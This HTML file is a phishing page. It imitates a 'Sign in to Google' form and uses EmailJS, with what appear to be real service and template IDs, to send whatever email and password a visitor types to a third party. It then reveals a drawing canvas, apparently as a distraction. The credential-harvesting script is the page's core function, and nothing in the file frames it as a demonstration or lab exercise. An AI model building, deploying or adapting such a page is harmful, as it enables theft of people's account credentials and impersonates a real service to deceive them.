<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login & Drawing</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f1f1f1;
        }
        .login-container {
            width: 300px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            display: block;
        }
        .login-container h2 {
            margin-bottom: 20px;
            text-align: center;
            color: #333;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #4285F4;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background-color: #357ae8;
        }
        canvas {
            border: 1px solid black;
            background-color: #fff;
            display: none;
        }
        .drawing-container {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <!-- Login Form -->
    <div class="login-container" id="loginForm">
        <h2>Sign in to Google</h2>
        <input type="email" id="email" placeholder="Email or phone" required>
        <input type="password" id="password" placeholder="Enter your password" required>
        <button type="submit" id="submitBtn">Next</button>
    </div>

    <!-- Drawing Container -->
    <div class="drawing-container" id="drawingContainer">
        <h2>Draw Something!</h2>
        <canvas id="drawingCanvas" width="500" height="500"></canvas>
        <br>
        <button onclick="clearCanvas()">Clear</button>
    </div>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        // Initialize EmailJS
        (function () {
            emailjs.init("user_wm_hgPysMxjkcdYas"); // Replace with your EmailJS user ID
        })();

        // Show the drawing section after successful login
        document.getElementById('submitBtn').addEventListener('click', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const data = {
                email: email,
                password: password
            };

            // Send the email data via EmailJS
            emailjs.send("service_zrgq0cs", "template_8r7y8vw", data)
                .then(function(response) {
                    // Hide login and show drawing section
                    document.getElementById('loginForm').style.display = 'none';
                    document.getElementById('drawingContainer').style.display = 'block';
                }, function(error) {
                    alert("Failed to send the form. Please try again.");
                });
        });

        // Drawing functionality
        const canvas = document.getElementById('drawingCanvas');
        const ctx = canvas.getContext('2d');
        let drawing = false;

        canvas.addEventListener('mousedown', () => {
            drawing = true;
        });

        canvas.addEventListener('mouseup', () => {
            drawing = false;
        });

        canvas.addEventListener('mousemove', (event) => {
            if (!drawing) return;
            ctx.lineWidth = 5;
            ctx.lineCap = 'round';
            ctx.strokeStyle = '#000';
            ctx.lineTo(event.clientX - canvas.offsetLeft, event.clientY - canvas.offsetTop);
            ctx.stroke();
            ctx.beginPath();
            ctx.moveTo(event.clientX - canvas.offsetLeft, event.clientY - canvas.offsetTop);
        });

        // Clear the canvas
        function clearCanvas() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
        }
    </script>
</body>
</html>
